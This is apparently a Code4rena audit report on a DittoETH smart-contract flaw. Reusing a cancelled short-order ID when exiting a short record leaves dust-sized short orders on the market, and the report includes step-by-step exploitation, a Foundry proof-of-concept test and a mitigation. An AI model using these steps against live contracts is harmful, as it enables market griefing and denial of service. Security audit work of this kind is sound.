# Original link
https://github.com/code-423n4/2024-03-dittoeth-findings/issues/129
# Lines of code

https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibSRUtil.sol#L84
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/BidOrdersFacet.sol#L155-L197
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/BidOrdersFacet.sol#L292-L296
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ExitShortFacet.sol#L67-L73


# Vulnerability details

## Summary
A user can create a Short Order with `ercAmount == minAskEth/2` by matching the short Order with a bid that fills it up to `minAskEth/2` and exiting the Short Record leaving only `minAskEth/2` in the Short Order with an empty Short Record.

## Description
This issue makes use of two properties in the codebase.

### **1. A short order can be matched such that only minAskEth/2 remains in the short order.**

A short order on the market can be matched by an incoming bid. This match is done in the call to `bidMatchAlgo()` function. Which tries to fill the bid with asks or shorts in the market. 

**[BidOrdersFacet.sol#L106-L111](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/BidOrdersFacet.sol#L106-L111)**
```solidity
        if (incomingBid.price >= lowestSell.price && (lowestSell.orderType == O.LimitAsk || lowestSell.orderType == O.LimitShort)) {
            // @dev if match and match price is gt .5% to saved oracle in either direction, update startingShortId
            LibOrders.updateOracleAndStartingShortViaThreshold(asset, LibOracle.getPrice(asset), incomingBid, shortHintArray);
            b.shortHintId = b.shortId = Asset.startingShortId;
            b.oraclePrice = LibOracle.getPrice(asset);
❌          return bidMatchAlgo(asset, incomingBid, orderHintArray, b);
```

In the call to `bidMatchAlgo()`, it goes through a loop and on each iteration, it first tries to match `lowestSell` in line 155 below. `lowestSell` is the current lowest bid or ask.  After matching it compares the ercAmount in the bid and lowest sell. 

If the ercAmount in the lowest sell exceeds that in the bid, the bid is filled and executes the `else` statement in line 179 below. If the amount left in the lowest sell is >= `LibAsset.minAskEth(asset).mul(C.DUST_FACTOR)`, `b.dustShortId` and `b.dustAskId` are set to zero in line 191 below. This ensures the lowest sell isn't deleted in the call to `matchIncomingBid()` function.

**[BidOrdersFacet.sol#L155-L197](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/BidOrdersFacet.sol#L155-L197)**
```solidity
155:                 matchlowestSell(asset, lowestSell, incomingBid, matchTotal);
156:                 if (incomingBid.ercAmount > lowestSell.ercAmount) {
157:                     incomingBid.ercAmount -= lowestSell.ercAmount;
158:                     lowestSell.ercAmount = 0; 
159:                     if (lowestSell.isShort()) {
160:                         b.matchedShortId = lowestSell.id;
161:                         b.prevShortId = lowestSell.prevId;
162:                         LibOrders.matchOrder(s.shorts, asset, lowestSell.id);
163:                         _shortDirectionHandler(asset, lowestSell, incomingBid, b);
164:                     } else {
165:                         b.matchedAskId = lowestSell.id;
166:                         LibOrders.matchOrder(s.asks, asset, lowestSell.id);
167:                         b.askId = lowestSell.nextId;
168:                     }
169:                 } else {
170:                     if (incomingBid.ercAmount == lowestSell.ercAmount) {
171:                         if (lowestSell.isShort()) {
172:                             b.matchedShortId = lowestSell.id;
173:                             b.prevShortId = lowestSell.prevId;
174:                             LibOrders.matchOrder(s.shorts, asset, lowestSell.id);
175:                         } else {
176:                             b.matchedAskId = lowestSell.id;
177:                             LibOrders.matchOrder(s.asks, asset, lowestSell.id);
178:                         }
179:                     } else {
180:                         lowestSell.ercAmount -= incomingBid.ercAmount;
181:                         if (lowestSell.isShort()) {
182:                             b.dustShortId = lowestSell.id;
183:                             STypes.Order storage lowestShort = s.shorts[asset][lowestSell.id];
184:                             lowestShort.ercAmount = lowestSell.ercAmount;
185:                         } else {
186:                             b.dustAskId = lowestSell.id;
187:                             s.asks[asset][lowestSell.id].ercAmount = lowestSell.ercAmount;
188:                         }
189:                         // Check reduced dust threshold for existing limit orders
190:                         if (lowestSell.ercAmount.mul(lowestSell.price) >= LibAsset.minAskEth(asset).mul(C.DUST_FACTOR)) {
191:                             b.dustShortId = b.dustAskId = 0;
192:                         }
193:                     }
194:                     incomingBid.ercAmount = 0;
195:                     return matchIncomingBid(asset, incomingBid, matchTotal, b);
196:                 }
197:             } else {

```

If the amount in `lowestSell` is less than `LibAsset.minAskEth(asset).mul(C.DUST_FACTOR)`, `matchIncomingBid()` deletes in the code section below.

**[BidOrdersFacet.sol#L292-L296](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/BidOrdersFacet.sol#L292-L296)**
```solidity
        if (b.dustAskId > 0) {
            IDiamond(payable(address(this)))._cancelAsk(asset, b.dustAskId);
        } else if (b.dustShortId > 0) {
            IDiamond(payable(address(this)))._cancelShort(asset, b.dustShortId);
        }
```

`LibAsset.minAskEth(asset).mul(C.DUST_FACTOR)` translates to `minAskEth/2` because `C.DUST_FACTOR` is a constant and is 0.5 ether. So if a short order has `minAskEth/2` it won't be deleted.


### 2. A Short Record can be exited with the id of a cancelled Short Order that still points to it.

When a call is made to the `exitShortWallet()` or `exitShortErcEscrowed()` function, `shortOrderId` is passed which is expected to be the order id of the Short Record currently being exited. `exitShortWallet()` function calls `checkShortMinErc()` and passes the `shortOrderId`.

**[ExitShortFacet.sol#L67-L73](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ExitShortFacet.sol#L67-L73)**
```solidity
        LibSRUtil.checkShortMinErc({
            asset: asset,
            initialStatus: initialStatus,
            shortOrderId: shortOrderId,
            shortRecordId: id,
            shorter: msg.sender
        });
```

In the call to `checkShortMinErc()`, the `shortOrderId` is verified in line 94 below by checking if the shortOrder currently points to Short Record or if its address points to the `shorter` i.e the owner of the Short Record. 

**[LibSRUtil.sol#L81-L99](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibSRUtil.sol#L81-L99)**
```solidity
091:         if (initialStatus == SR.PartialFill) {
092:             // Verify shortOrder
093:             STypes.Order storage shortOrder = s.shorts[asset][shortOrderId];
094:             if (shortOrder.shortRecordId != shortRecordId || shortOrder.addr != shorter) revert Errors.InvalidShortOrder();
095: 
096:             if (shortRecord.status == SR.Closed) {
097:                 // Check remaining shortOrder
098:                 if (shortOrder.ercAmount < minShortErc) {
099:                     // @dev The resulting SR will not have PartialFill status after cancel
100:                     LibOrders.cancelShort(asset, shortOrderId);
101:                     isCancelled = true;
102:                 }
103:             } else {
104:                 // Check remaining shortOrder and remaining shortRecord
105:                 if (shortOrder.ercAmount + shortRecord.ercDebt < minShortErc) revert Errors.CannotLeaveDustAmount();
106:             }
107:         } else if (shortRecord.status != SR.Closed && shortRecord.ercDebt < minShortErc) {
108:             revert Errors.CannotLeaveDustAmount();
109:         }

```
 
Note that it doesn't check if the Short Order is cancelled. This means we can use a cancelled Short Order that points to the ShortRecord and is owned by the owner of the Short Record being exited.

A malicious user can use these two properties of the codebase to create a Short Order that has `minAskEth/2` as ercAmount and 0 debt in its Short Record by following these setps:

1. Create 1 short order with address A and another with address B. They shouldn't get matched.
2. Cancel address A's short Order than cancel address B's. This order is strict and is to ensure Address B's Short Order is reused before address A's.
3. Create another Short Order with address A of 3000 DUSD that doesn't get matched. This short will reuse the id of the Short Record associated with its first Short Order but will reuse address B's Short Order as its Short Order. This leaves address A's former Short Order cancelled but still pointing to its Short Record.
4. Create a Bid of `3000 - minAskEth/2 DUSD` to match the Short Order and leave minAskEth/2 in the Short Order. This also lets the Short Order have a Partially Filled status to pass the check on line 91 above.
5. Exit the Short Order with `3000 - minAskEth/2` DUSD as `buybackAmount` and the former id of address A's cancelled Short Order. The `buybackAmount` is the amount of debt (DUSD) to pay back. So we'll be paying everything back.
6. After paying back we'll have an empty Short Record and the Short Order will have an ercAmount of `minAskEth/2`.


If the `minAskEth` is small, we'll end up creating small Short Orders in the market. Short Orders like this may make a transaction trying to fill a large order run out of gas and may disincentivize liquidators from liquidating them if they become liquidatable.

## Impact
The issue above has the following effects:
1. Large orders may run out of gas if a malicious user puts many orders with `minAskEth/2` erc amounts on the market.
2. Liquidators are disincentivized from liquidating them because of their small amounts.


## Proof of Concept
The test below can be run in the [Shorts.t.sol](https://github.com/code-423n4/2024-03-dittoeth/blob/main/test/Shorts.t.sol) file. It shows how a malicious user can create a Short Order with a small amount.

Make sure to import the library below.
`import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";`

```solidity
    function test_CreateTinySR() public {
        // create two short orders 
        fundLimitShortOpt(0.5 ether, 2000 ether, receiver);
        fundLimitShortOpt(1 ether, 5000 ether, sender);
        
        vm.prank(sender);
        cancelShort(101); // cancel sender's short order so it won't be the first reused order
        
        vm.startPrank(receiver);
        cancelShort(100); // cancel receiver's short order so it will be the first reused order
        vm.stopPrank();
        
        // 1. Create a short add it to the market, the short reuses id 100 (receiver's former short).
        // 2. Create a bid and let it match the short leaving minAskEth/2 i.e minAskEth*dustFactor.
        //    The dust factor is 0.5.
        uint minAskEth = diamond.getAssetNormalizedStruct(asset).minAskEth;
        uint88 debt = uint88(3000 ether - minAskEth/2);
        fundLimitShortOpt(1 ether, 3000 ether, sender);
        fundLimitBidOpt(1 ether, debt, receiver);

        // The sender's Short Record is reused and partially filled. It also has a new short Order.
        // The old cancelled short Order still references this ShortRecord.
        STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
        assertTrue(short.status == SR.PartialFill); 
        // The Short Record's new Short Order
        STypes.Order[] memory shortOrders = getShorts();
        assertEq(shortOrders.length, 1);
        assertEq(shortOrders[0].id, 100);
        assertEq(shortOrders[0].ercAmount, minAskEth/2); // order has minAsk/2
        
        // give sender the amount needed to exit
        deal(asset, sender, debt);
        vm.prank(sender);

        // exit with the old short order id which has > minShortErc
        diamond.exitShortWallet(asset,  C.SHORT_STARTING_ID, debt, 101);
        // short Order still exists
        shortOrders = getShorts();
        assertEq(shortOrders[0].id, 100);
        assertEq(shortOrders[0].ercAmount, minAskEth/2);
        // short Record has been closed and will only be filled up to minAskEth/2
        short = getShortRecord(sender, C.SHORT_STARTING_ID);
        assertEq(uint(short.status), uint(SR.Closed)); 
    }
```

## Tools Used
Manual Analysis

## Recommended Mitigation Steps
Consider checking if the Short Order being validated in `checkShortMinErc()` is cancelled.

**[LibSRUtil.sol#L84](https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibSRUtil.sol#L84)**
```solidity
-    if (shortOrder.shortRecordId != shortRecordId || shortOrder.addr != shorter) revert Errors.InvalidShortOrder();
+    if (shortOrder.shortRecordId != shortRecordId || shortOrder.addr != shorter || shortOrder.orderType == O.Cancelled) revert Errors.InvalidShortOrder();
```








## Assessed type

DoS